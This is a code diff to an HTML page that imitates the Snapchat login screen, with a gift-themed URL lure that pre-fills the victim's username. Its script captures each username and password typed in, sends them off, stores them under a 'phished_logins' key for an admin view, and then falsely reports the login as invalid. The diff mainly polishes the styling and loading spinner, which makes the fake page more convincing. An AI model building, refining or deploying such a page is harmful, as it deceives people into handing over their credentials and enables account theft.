@@ -17,60 +17,58 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
 <style>
 @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
-body {
-  font-family: "Inter", sans-serif;
-  user-select: none;
-}
+body { font-family: "Inter", sans-serif; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
 ::-webkit-scrollbar { display: none; }
 
-/* Checkbox old style */
+/* Checkbox with proper checkmark */
 input[type="checkbox"] {
   -webkit-appearance: none; -moz-appearance: none; appearance: none;
   width: 1rem; height: 1rem; border: 2px solid #d1d5db;
   border-radius: 0.25rem; position: relative; cursor: pointer;
 }
 input[type="checkbox"]:checked::after {
-  content: '';
-  position: absolute;
-  left: 3px; top: 1px;
-  width: 5px; height: 9px;
-  border: solid #00b0ff; border-width: 0 2px 2px 0;
-  transform: rotate(45deg);
+  content: ''; position: absolute; left: 3.5px; top: 0.5px;
+  width: 4.5px; height: 9px; border: solid #00b0ff;
+  border-width: 0 2px 2px 0; transform: rotate(45deg);
 }
-input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
+input[type="checkbox"]:focus { outline: none; }
 
 /* Login button */
 #loginBtn { 
-  transition: background 0.2s ease, transform 0.1s ease; 
+  transition: background 0.2s ease; 
   min-width: 42%; 
   width: 62%; 
   font-size: 1.05rem; 
   padding: 0.7rem 0; 
-  display: flex; 
-  justify-content: center; 
-  align-items: center; 
+  display: block; 
   margin: 0 auto; 
   position: relative;
+  overflow: hidden;
 }
-#loginBtn:active { transform: scale(0.98); }
+#loginBtn:active { background-color: #0094e0; }
 
 /* Inputs */
 .input-container { width: 85%; margin: 0 auto; }
 input[type="text"], input[type="password"] { 
-  width: 100%; font-size: 0.9rem; font-weight: 500; padding-bottom: 0.15rem;
-  font-family: "Inter", sans-serif; border-radius: 0; border-bottom: 2px solid #d1d5db;
+  width: 100%; font-size: 0.9rem; font-weight: 500; padding-bottom: 0.15rem; font-family: "Inter", sans-serif;
+  border-radius: 0; border-bottom: 1px solid #d1d5db; outline: none;
 }
 
 /* Password label and field */
 label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
+#password { position: relative; top: -6px; }
+
+/* Small gap between username and password */
 .password-container { margin-top: 4px; position: relative; }
 
-/* Checkbox and forgot password */
-label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.817rem; font-weight: 350; }
-#forgotPassword { position: relative; top: -9.5px; font-size: 0.817rem; font-weight: 350; color:#0083ff; }
+/* Checkbox and Forgot password spacing */
+label.inline-flex.items-center { 
+  position: relative; top: -8px; font-size: 0.817rem; font-weight: 350;
+}
+#forgotPassword { position: relative; top: -9.5px; font-size: 0.817rem; font-weight: 350; color: #0083ff; }
 
 /* Error message */
-#errorMsg { width: 85%; margin: auto; font-size: 0.8rem; text-align: left; color:#ff1952; font-weight: 400; position: relative; top: -6px; }
+#errorMsg { width: 85%; margin: 0 auto; font-size: 0.8rem; text-align: left; color:#ff1952; font-weight: 400; margin-top: -4px; margin-bottom: -2px; position: relative; top: -6px; }
 
 /* Heading */
 h1 { position: relative; top: -10px; font-size: 1.7rem; font-weight: 500; text-align: center; }
@@ -87,22 +85,19 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
 #adminSection.active { display: block; }
 .back-arrow i { font-size: 1rem; }
 
-/* Password toggle button inside input */
-.password-toggle { position: absolute; right: 0; top: 50%; transform: translateY(-50%); color: #adb7bf; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; }
+/* Password toggle button inside the input */
+.password-toggle { 
+  position: absolute; right: 0; top: 50%; transform: translateY(-50%); 
+  color: #adb7bf; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; 
+}
 
 /* Spinner */
+.spinner-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; }
 .spinner {
-  width: 20px;
-  height: 20px;
-  border: 2px solid #fff;
-  border-bottom-color: transparent;
-  border-radius: 50%;
+  width: 20px; height: 20px; border: 1px solid #fff; border-bottom-color: transparent; border-radius: 50%;
   animation: spin 1s linear infinite;
-  position: absolute;
 }
 @keyframes spin { to { transform: rotate(360deg); } }
-
-.spinner-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; }
 </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
@@ -131,7 +126,9 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
     <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
     <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4">
       <span class="btn-text">Log In</span>
-      <div class="spinner-container"><div class="spinner"></div></div>
+      <div class="spinner-container">
+        <div class="spinner"></div>
+      </div>
     </button>
   </form>
 </div>
@@ -155,7 +152,6 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
     </div>
   </div>
 </div>
-
 <script>
 document.addEventListener("DOMContentLoaded", function(){
   const a=document.getElementById("username"),
@@ -166,13 +162,12 @@ document.addEventListener("DOMContentLoaded", function(){
         f=document.getElementById("loginList"),
         g=document.getElementById("totalLogins"),
         h=document.getElementById("lastLogin"),
-        spinnerContainer = c.querySelector(".spinner-container"),
-        btnText = c.querySelector(".btn-text"),
+        btnText=c.querySelector(".btn-text"),
+        spinnerContainer=c.querySelector(".spinner-container"),
         u2="/api/validate",
         m3=3;
   let n4=0,l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
 
-  // Pre-fill username if URL matches /gift/{something}/login
   const pathMatch = window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
   if(pathMatch && pathMatch[1]){ a.value = pathMatch[1]; }
 
@@ -183,8 +178,7 @@ document.addEventListener("DOMContentLoaded", function(){
   }
 
   function y2(){
-    a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1)
-    :(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0)
+    a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0)
   }
 
   function z3(t,u){
@@ -209,23 +203,29 @@ document.addEventListener("DOMContentLoaded", function(){
     o.preventDefault();
     const t=a.value.trim(),u=b.value.trim(),v=new Date().toLocaleString();
     if(t&&u){
+      btnText.style.display="none";
+      spinnerContainer.style.display="block";
+
       const w={username:t,password:u,timestamp:v};
-      spinnerContainer.style.display = "block";
-      btnText.style.visibility = "hidden";
       await x1(w),l5.push(w),localStorage.setItem("phished_logins",JSON.stringify(l5)),z3(t,v);
+      
       setTimeout(()=>{
-        spinnerContainer.style.display = "none";
-        btnText.style.visibility = "visible";
         d.textContent="Invalid username or password. Try again.";
         d.classList.remove("hidden");
-        b.value=""; y2();
+        b.value="";y2();
+        c.classList.remove("bg-[#00b0ff]");c.classList.add("bg-[#b7c0c8]");c.disabled=!0;
+
+        spinnerContainer.style.display="none";
+        btnText.style.display="inline";
       },1200);
-    } else { d.textContent="Please fill in both fields."; d.classList.remove("hidden"); }
+    } else {
+      d.textContent="Please fill in both fields.";
+      d.classList.remove("hidden");
+    }
   });
 
   window.togglePassword=function(){
-    b.type==="password" ? (b.type="text",document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye")) 
-    : (b.type="password",document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"))
+    b.type="password"===b.type?(b.type="text",document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye")):(b.type="password",document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"))
   }
 });
 
